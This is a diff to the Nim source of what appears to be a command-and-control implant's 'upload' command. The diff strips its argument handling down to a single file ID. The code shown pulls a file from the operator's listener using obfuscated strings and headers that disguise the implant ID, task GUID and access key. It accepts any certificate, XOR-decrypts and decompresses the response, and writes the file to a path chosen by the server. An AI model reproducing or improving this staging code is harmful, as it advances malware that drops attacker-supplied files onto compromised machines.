@@ -27,85 +27,19 @@ import base64
 proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
     var 
         fileId : string
-        fileName : string
-        filePath : string
         url : string
     
-    # Debug: Print received arguments
+    # Verify arguments
     echo obf("DEBUG Upload: Received args: ") & $args.len & obf(" - ") & $args
     
-    if args.len == 1 and args[0] != "":
-        # Case 1: Only receives fileId (server sends: ["upload", file_id])
-        # FileId can be a pure MD5 hash or a path with filename
-        fileId = args[0]
-        
-        # Check if it's a pure MD5 hash (32 hexadecimal characters)
-        var isMD5Hash = false
-        if fileId.len == 32:
-            # Check if all characters are hexadecimal
-            isMD5Hash = true
-            for c in fileId:
-                if c notin {'0'..'9', 'a'..'f', 'A'..'F'}:
-                    echo obf("DEBUG Upload: Not a pure MD5 hash - detected non-hex character")
-                    isMD5Hash = false
-                    break
-        
-        if isMD5Hash:
-            echo obf("DEBUG Upload: Detected pure MD5 hash - will use 'file' as default name")
-            fileName = "file"  # Use a generic name since the hash doesn't contain an extension
-        else:
-            # Try to extract filename from ID as before
-            echo obf("DEBUG Upload: Extracting filename from fileId path")
-            fileName = fileId.split("/")[^1]  
-        
-        echo obf("DEBUG Upload: Single arg mode - fileId: ") & fileId & obf(", fileName: ") & fileName
-        filePath = getCurrentDir()/fileName
-    elif args.len == 2:
-        # Case 2: Receives fileId and remotePath, but remotePath might be empty
-        fileId = args[0]
-        
-        echo obf("DEBUG Upload: Two args mode - fileId: ") & fileId & obf(", arg2: ") & args[1]
-        
-        if args[1] == "" or args[1] == "\"\"":
-            # If the second argument is empty, determine the name based on whether it's a hash or not
-            var isMD5Hash = false
-            if fileId.len == 32:
-                # Check if all characters are hexadecimal
-                isMD5Hash = true
-                for c in fileId:
-                    if c notin {'0'..'9', 'a'..'f', 'A'..'F'}:
-                        isMD5Hash = false
-                        break
-            
-            if isMD5Hash:
-                echo obf("DEBUG Upload: Detected pure MD5 hash with empty path - using 'file' as name")
-                fileName = "file"
-            else:
-                echo obf("DEBUG Upload: Using filename from fileId path")
-                fileName = fileId.split("/")[^1]
-                
-            filePath = getCurrentDir()/fileName
-        else:
-            # If the second argument is not empty, use it as the full path
-            echo obf("DEBUG Upload: Using provided path: ") & args[1]
-            filePath = args[1]
-    elif args.len == 3 and args[0] != "" and args[1] != "" and args[2] != "":
-        # Case 3: Receives fileId, fileName and remotePath
-        fileId = args[0]
-        fileName = args[1]  # Now we use fileName for the filename
-        filePath = args[2]
-        echo obf("DEBUG Upload: Three args mode - fileId: ") & fileId & obf(", fileName: ") & fileName & obf(", path: ") & filePath
-    elif args.len >= 4:
-        # Case 4: In case remotePath has spaces and was split into multiple arguments
-        fileId = args[0]
-        fileName = args[1]  # Now we use fileName for the filename
-        filePath = args[2 .. ^1].join(" ")
-        echo obf("DEBUG Upload: Multiple args mode - fileId: ") & fileId & obf(", fileName: ") & fileName & obf(", path: ") & filePath
-    else:
-        result = obf("Invalid number of arguments received. Usage: 'upload [local file] <optional: remote destination path>'.")
-        return
+    if args.len == 0 or args[0] == "":
+        return obf("Invalid number of arguments received. Usage: 'upload [file_id]'.")
     
-    # Build URL with fileId (can now be an MD5 hash)
+    # Get the file hash ID
+    fileId = args[0]
+    echo obf("DEBUG Upload: fileId: ") & fileId
+    
+    # Build URL with fileId
     url = toLowerAscii(li.listenerType) & obf("://")
     if li.listenerHost != "":
         url = url & li.listenerHost
@@ -115,13 +49,13 @@ proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
     
     echo obf("DEBUG Upload: Requesting file from URL: ") & url
 
-    # Get the file - Puppy will take care of transparent deflation of the gzip layer
+    # Get the file
     let req = Request(
         url: parseUrl(url),
         headers: @[
                 Header(key: obf("User-Agent"), value: li.userAgent),
-                Header(key: obf("X-Request-ID"), value: li.id), # Implant ID
-                Header(key: obf("Content-MD5"), value: cmdGuid),  # Task GUID
+                Header(key: obf("X-Request-ID"), value: li.id),
+                Header(key: obf("Content-MD5"), value: cmdGuid),
                 Header(key: obf("X-Correlation-ID"), value: li.httpAllowCommunicationKey)
             ],
         allowAnyHttpsCertificate: true,
@@ -130,43 +64,43 @@ proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
 
     # Check the result
     if res.code != 200:
-        result = obf("Something went wrong uploading the file (Implant did not receive response from staging server '") & url & obf("').")
-        return
+        return obf("Error uploading file: Server returned code ") & $res.code
     
     # Log status code for debugging
     echo obf("DEBUG Upload: Response status: ") & $res.code
     
-    # Handle the encrypted and compressed response
+    # Process file content
     var dec = decryptData(res.body, li.UNIQUE_XOR_KEY)
     var decStr: string = cast[string](dec)
     var fileBuffer: seq[byte] = convertToByteSeq(uncompress(decStr))
 
-    # Check if the server provided the original filename 
-    var originalFilename = ""
-    
-    # Try to get the header directly from the server - this is critical
+    # CRITICAL: Get the filename from header
+    var finalPath: string
     try:
-        originalFilename = base64.decode(res.headers["X-Original-Filename"])
-        if originalFilename != "":
-            echo obf("DEBUG Upload: Received encrypted filename from server")
-            # Decrypt the filename using XOR
-            originalFilename = decryptData(originalFilename, li.UNIQUE_XOR_KEY)
-            echo obf("DEBUG Upload: Decrypted original filename: ") & originalFilename
-            # ALWAYS use the filename provided by the server
-            fileName = originalFilename
-            echo obf("DEBUG Upload: Using server-provided filename: ") & fileName
-    except:
-        echo obf("DEBUG Upload: Warning! No X-Original-Filename header found, using default name: ") & fileName
-        # The server should ALWAYS provide this header, so this is an error case
-
-    # Determine the final path where the file will be saved
-    if args.len >= 2 and args[1] != "" and args[1] != "\"\"":
-        # If a specific path was explicitly specified, use it
-        echo obf("DEBUG Upload: Using explicitly specified path: ") & filePath
-    else:
-        # If no specific path, use the current directory with the filename
-        filePath = getCurrentDir()/fileName
-        echo obf("DEBUG Upload: Using current directory with filename: ") & filePath
+        let encryptedFilename = base64.decode(res.headers["X-Original-Filename"])
+        let serverFilename = decryptData(encryptedFilename, li.UNIQUE_XOR_KEY)
+        echo obf("DEBUG Upload: Decrypted original filename: ") & serverFilename
         
-    filePath.writeFile(fileBuffer)
-    result = obf("Uploaded file to '") & filePath & obf("'.")
+        # Determine final path - always use the filename from server
+        finalPath = serverFilename
+        
+        # If path is not absolute, prefix with current directory
+        if not (finalPath.startsWith("/") or (finalPath.len >= 2 and finalPath[1] == ':')):
+            finalPath = getCurrentDir() / serverFilename
+            
+        echo obf("DEBUG Upload: Final path for file: ") & finalPath
+        
+        # Ensure directory exists
+        try:
+            let dirPath = os.parentDir(finalPath)
+            if dirPath != "" and not os.dirExists(dirPath):
+                os.createDir(dirPath)
+        except:
+            echo obf("DEBUG Upload: Warning - Could not create parent directories")
+            
+    except:
+        return obf("Error: Server did not provide valid filename in X-Original-Filename header")
+
+    # Save file
+    finalPath.writeFile(fileBuffer)
+    return obf("Uploaded file to '") & finalPath & obf("'.")
